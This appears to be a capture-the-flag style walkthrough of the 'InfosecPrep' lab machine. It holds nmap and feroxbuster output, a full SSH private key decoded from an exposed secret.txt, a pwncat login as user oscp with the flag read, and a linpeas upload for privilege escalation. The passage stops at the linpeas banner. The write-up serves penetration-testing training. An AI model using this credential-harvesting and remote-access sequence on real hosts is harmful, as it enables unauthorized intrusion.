# InfosecPrep

## Let's start !!

First, we set an IP variable

````````bash
export IP=192.168.107.89
````````

### Scanning 

As always we start with nmap scan.

````````bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN ull_tcp_nmap.txt 192.168.107.89
````````

````````bash
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTlNTlvI4qQLNU17b70iKB5xuJlNnZ3zMZeHzfG3H5TcsVNmgImTe4FjEez0e4lKqJvTMsxrPVFHTq6gqfYHwN0KN34x0dv0ngrc+wrrWNoHQrQQqeFuTZy0Tt6BY97082YpFvZfDAvAwJoutkyCxeBb1+C9Y7g6kQYXlNFOuHoq/2m6vki9yVW7Bu3IVeLryw/7pnwzb/tr3K86GEsGc8+87ZIyFrgE1Rca/Y1hD03Uk0s/Kpmi3hCybJwPIoB1WmO2Xz2US8xqzuefsX6UzRazFTQKlTCq5gTTkpNE5fJzS/WmvK7w79aoFJPmVBCXOSXkoe9uoi9a64OnsY0jF8ao7uOUJp84QIUyPRLuPXqlxXwZenqt5RKH6dXyw9tsV2Q3BvZwJwvStFjiQFIi2zIp5jmVcYxwqV4CTt7Ev0ybATE00YAfCoS5i2LJR+fquN9XkS4ay3p9qoZZW7Q4uujWfUUaSO/gYLiOTpbTOl4Smgzc+NvqFrUk1OxPttDSc=
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOX6nl2HC2/Prh0l8uVsnAzinDT2+rhj1VasPM8Df3ntzgb8XzQat7zC/nHm0v7yLWo/CjpI6pD+mrBh3P/wuqk=
|   256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBefJyPm1sjN+QedhTj6S1CPbXQZEFXb58RICJh970R8
80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-generator: WordPress 5.4.2
|_http-title: OSCP Voucher &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4333/tcp  filtered msql    no-response
10346/tcp filtered unknown no-response
14391/tcp filtered unknown no-response
23171/tcp filtered unknown no-response
25568/tcp filtered unknown no-response
28395/tcp filtered unknown no-response
33060/tcp open     socks5  syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Invalid message"
|     HY000
|   Radmin: 
|     authentication.mechanisms
|     MYSQL41
|     SHA256_MEMORY
|     doc.formats
|     text
|     client.interactive
|     compression
|     algorithm
|     deflate_stream
|     lz4_message
|     zstd_stream
|     node_type
|     mysql
|_    client.pwd_expire_ok
| socks-auth-info: 
|   No authentication
|   No authentication
|_  No authentication
36977/tcp filtered unknown no-response
39659/tcp filtered unknown no-response
45786/tcp filtered unknown no-response
60178/tcp filtered unknown no-response
61554/tcp filtered unknown no-response
61625/tcp filtered unknown no-response
64072/tcp filtered unknown no-response
64443/tcp filtered unknown no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.92%I=9%D=9/13%Time=631F982F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Hello,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x0
SF:8\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SSLv23SessionRe
SF:q,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInv
SF:alid\x20message\"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchR
SF:eq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInval
SF:id\x20message\"\x05HY000")%r(DistCCD,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Radmin,15D,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0P\x01\0\0\x02\n\x0f\n\x03tls\x12\x08\x08\x01\x12\x04\x08
SF:\x07@\0\nM\n\x19authentication\.mechanisms\x120\x08\x03\",\n\x11\x08\x0
SF:1\x12\r\x08\x08J\t\n\x07MYSQL41\n\x17\x08\x01\x12\x13\x08\x08J\x0f\n\rS
SF:HA256_MEMORY\n\x1d\n\x0bdoc\.formats\x12\x0e\x08\x01\x12\n\x08\x08J\x06
SF:\n\x04text\n\x1e\n\x12client\.interactive\x12\x08\x08\x01\x12\x04\x08\x
SF:07@\0\nn\n\x0bcompression\x12_\x08\x02\x1a\[\nY\n\talgorithm\x12L\x08\x
SF:03\"H\n\x18\x08\x01\x12\x14\x08\x08J\x10\n\x0edeflate_stream\n\x15\x08\
SF:x01\x12\x11\x08\x08J\r\n\x0blz4_message\n\x15\x08\x01\x12\x11\x08\x08J\
SF:r\n\x0bzstd_stream\n\x1c\n\tnode_type\x12\x0f\x08\x01\x12\x0b\x08\x08J\
SF:x07\n\x05mysql\n\x20\n\x14client\.pwd_expire_ok\x12\x08\x08\x01\x12\x04
SF:\x08\x07@\0");
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 3.5 (91%), Linux 4.2 (91%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 4.4 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/13%OT=22%CT=1%CU=32291%PV=Y%DS=2%DC=T%G=Y%TM=631F98B
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=103%TI=Z%TS=A)OPS(O1=M54EST
OS:11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M5
OS:4EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%
OS:T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=
OS:N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
OS:G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 39.102 days (since Thu Aug  4 23:41:33 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   172.89 ms 192.168.49.1
2   173.09 ms 192.168.107.89

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 13 02:08:08 2022 -- 1 IP address (1 host up) scanned in 738.58 seconds

````````
so we have ports 22,80,33060 open. I have enumerated port 80 (HTTP) because there is nothing on port 22 (ssh) 33060 (socks5)

### Web Enumration

````````bash
feroxbuster -u http://192.168.107.89:80/ -t 100 -w /root/.config/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp,js,bak" -v -k -n -q -e -o "feroxbuster.txt"
````````

````````python
200      GET       46l       46w     3502c http://192.168.107.89/secret.txt
500      GET        0l        0w        0c http://192.168.107.89/wp-content/themes/twentytwenty/
403      GET        9l       28w      279c http://192.168.107.89/.htaccess
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.txt
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.html
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.php
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.asp
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.aspx
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd
403      GET        9l       28w      279c http://192.168.107.89/.hta
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.jsp
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.txt
403      GET        9l       28w      279c http://192.168.107.89/.hta.txt
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.js
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.html
403      GET        9l       28w      279c http://192.168.107.89/.hta.html
403      GET        9l       28w      279c http://192.168.107.89/.htaccess.bak
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.php
403      GET        9l       28w      279c http://192.168.107.89/.hta.php
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.asp
403      GET        9l       28w      279c http://192.168.107.89/.hta.asp
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.aspx
403      GET        9l       28w      279c http://192.168.107.89/.hta.aspx
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.jsp
403      GET        9l       28w      279c http://192.168.107.89/.hta.jsp
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.js
403      GET        9l       28w      279c http://192.168.107.89/.hta.js
403      GET        9l       28w      279c http://192.168.107.89/.htpasswd.bak
403      GET        9l       28w      279c http://192.168.107.89/.hta.bak
200      GET      817l     3034w    25570c http://192.168.107.89/wp-content/themes/twentytwenty/assets/js/index.js
200      GET       86l      290w     4829c http://192.168.107.89/wp-login.php
301      GET        0l        0w        0c http://192.168.107.89/index.php/ => http://192.168.107.89/
200      GET        2l       15w     1434c http://192.168.107.89/wp-includes/js/wp-embed.min.js
200      GET      452l     1981w        0c http://192.168.107.89/
403      GET        9l       28w      279c http://192.168.107.89/.html
403      GET        9l       28w      279c http://192.168.107.89/.php
301      GET        0l        0w        0c http://192.168.107.89/index.php => http://192.168.107.89/
301      GET        9l       28w      321c http://192.168.107.89/javascript => http://192.168.107.89/javascript/
200      GET      384l     3177w    19915c http://192.168.107.89/license.txt
302      GET        0l        0w        0c http://192.168.107.89/wp-admin/import.php => http://192.168.107.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.107.89%2Fwp-admin%2Fimport.php&reauth=1
200      GET       13l       78w     2480c http://192.168.107.89/wp-admin/images/wordpress-logo.png
302      GET        0l        0w        0c http://192.168.107.89/wp-admin/update-core.php => http://192.168.107.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.107.89%2Fwp-admin%2Fupdate-core.php&reauth=1
200      GET       17l       85w     1361c http://192.168.107.89/wp-admin/install.php
200      GET       26l       93w     1456c http://192.168.107.89/wp-admin/upgrade.php
200      GET        2l        4w       36c http://192.168.107.89/robots.txt
302      GET        0l        0w        0c http://192.168.107.89/wp-admin/ => http://192.168.107.89/wp-login.php?redirect_to=http%3A%2F%2F192.168.107.89%2Fwp-admin%2F&reauth=1
200      GET      391l      778w     6147c http://192.168.107.89/wp-admin/css/install.css
200      GET       97l      823w     7278c http://192.168.107.89/readme.html
403      GET        9l       28w      279c http://192.168.107.89/server-status
301      GET        9l       28w      319c http://192.168.107.89/wp-admin => http://192.168.107.89/wp-admin/
301      GET        9l       28w      321c http://192.168.107.89/wp-content => http://192.168.107.89/wp-content/
301      GET        9l       28w      322c http://192.168.107.89/wp-includes => http://192.168.107.89/wp-includes/
200      GET        0l        0w        0c http://192.168.107.89/wp-blog-header.php
200      GET        0l        0w        0c http://192.168.107.89/wp-config.php
200      GET        0l        0w        0c http://192.168.107.89/wp-cron.php
200      GET        0l        0w        0c http://192.168.107.89/wp-load.php
200      GET       11l       24w      227c http://192.168.107.89/wp-links-opml.php
403      GET      121l      315w     2709c http://192.168.107.89/wp-mail.php
500      GET        0l        0w        0c http://192.168.107.89/wp-settings.php
200      GET        5l       15w      135c http://192.168.107.89/wp-trackback.php
302      GET        0l        0w        0c http://192.168.107.89/wp-signup.php => http://192.168.107.89/wp-login.php?action=register
200      GET        2l      369w    16154c http://192.168.107.89/wp-includes/js/underscore.min.js
405      GET        1l        6w       42c http://192.168.107.89/xmlrpc.php
200      GET        2l       17w     1079c http://192.168.107.89/wp-includes/js/wp-util.min.js
200      GET        6l     1394w    96873c http://192.168.107.89/wp-includes/js/jquery/jquery.js
200      GET        2l       13w      766c http://192.168.107.89/wp-admin/js/password-strength-meter.min.js
200      GET        2l        9w      353c http://192.168.107.89/wp-includes/js/zxcvbn-async.min.js
200      GET        2l       56w     5583c http://192.168.107.89/wp-admin/js/user-profile.min.js
200      GET        2l      281w    10056c http://192.168.107.89/wp-includes/js/jquery/jquery-migrate.min.js
302      GET        0l        0w        0c http://192.168.107.89/wp-activate.php => http://192.168.107.89/wp-login.php?action=register

````````
the secret.txt looks interesting... let's see what it is.

````````python
curl http://192.168.107.89/secret.txt
````````

````````
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
````````
its looks like a base64 encoded string. let's decode it and download it.

````````python
curl http://192.168.107.89/secret.txt | base64 -d | tee id_rsa
````````

````````
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3502  100  3502    0     0   9054      0 --:--:-- --:--:-- --:--:--  9072
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----

````````
it is an ssh private key. so we can log in as ``oscp``.

### Exploitation

````````bash
pwncat-cs oscp@$IP -i id_rsa
[17:38:20] Welcome to pwncat 🐈!                                                                                                                                              __main__.py:164
[17:38:21] connection failed: ssh connection failed: [Errno 111] Connection refused                                                                                            manager.py:957
(local) pwncat$                                                                                                                                                                              
[17:38:42] no active session, returning to local prompt                                                                                                                        manager.py:957
(local) pwncat$ exit
[17:38:45] closing interactive prompt                                                                                                                                          manager.py:957
                                                                                                                                                                                             
┌──(root㉿Tanmoy)-[~/Proving-grounds/Play/InfosecPrep]
└─# pwncat-cs oscp@192.168.107.89 -i id_rsa
[17:38:58] Welcome to pwncat 🐈!                                                                                                                                              __main__.py:164
[17:39:05] 192.168.107.89:22: registered new host w/ db                                                                                                                        manager.py:957
(local) pwncat$                                                                                                                                                                              
(remote) oscp@oscp:/home/oscp$ ls
ip  local.txt
(remote) oscp@oscp:/home/oscp$ cat local.txt 
972c61499b0e5eb29a6d76f4aac378f4
(remote) oscp@oscp:/home/oscp$ 

````````

### Privilage Esculation 

````````bash
(remote) oscp@oscp:/home/oscp$ 
(remote) oscp@oscp:/home/oscp$ 
(local) pwncat$ upload /opt/PEASS-ng/linPEAS/linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 777.0/777.0 KB • ? • 0:00:00
[17:42:43] uploaded 777.00KiB in 3.31 seconds                                                                                                                                    upload.py:76
(local) pwncat$                                                                                                                                                                              
(remote) oscp@oscp:/home/oscp$ chmod +x linpeas.sh 
(remote) oscp@oscp:/home/oscp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
